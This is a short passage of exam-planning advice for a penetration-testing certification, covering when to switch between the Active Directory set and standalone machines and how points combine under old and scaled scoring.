Fallback: if the AD set stalls. If several hours pass with no new information, switch to promising standalone leads, document what you complete, then return to AD with fresh eyes. Under scaled scoring there is no fixed standalone total that makes up for a particular AD total.

Situation at about hour 12 Estimated raw points Next move AD 40, one standalone foothold 50 Follow the strongest remaining foothold or privilege-escalation lead; check evidence first AD 20, nothing standalone 20 Standalones now; return to AD later AD 0, two full standalones 40 Revisit AD enumeration and credentials; assess the remaining standalone too

For pre-change attempts only, 40 AD + 30 standalone reaches the fixed 70-raw-point mark if all evidence is accepted. The old 80-point planning target provided room for lost credit; it was never a substitute for valid proof and must not be carried over as a scaled-scoring pass target. See the pre-change combinations.
